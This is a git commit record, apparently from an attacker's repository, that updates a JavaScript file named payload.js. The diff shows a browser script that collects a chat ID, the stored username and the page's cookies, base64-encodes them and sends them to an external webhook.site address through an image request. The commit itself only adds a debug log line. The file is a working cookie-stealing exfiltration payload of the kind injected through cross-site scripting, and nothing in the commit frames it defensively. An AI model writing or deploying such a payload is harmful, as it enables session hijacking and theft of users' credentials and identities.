5b1d7a0ed468941485fb26f9651891232085dce6
K1NG5P4RR0W <koguifrejus@gmail.com>
2025-05-07 18:31:47 +0100

    Update payload.js

--- payload.js
+++ payload.js
@@ -2,6 +2,7 @@
   const chatId = document.getElementById('chat-config')?.dataset?.chatId || 'unknown';
   const user = localStorage.getItem('username') || 'anon';
   const payload = btoa(`chatId=${chatId}&user=${user}&cookie=${document.cookie}`);
+  console.log("[DEBUG] Payload ready:", payload);
   const img = new Image();
   img.src = `https://webhook.site/a952eb63-9ea4-4de7-8361-be7ea6b39233/?data=${payload}`;
 })();
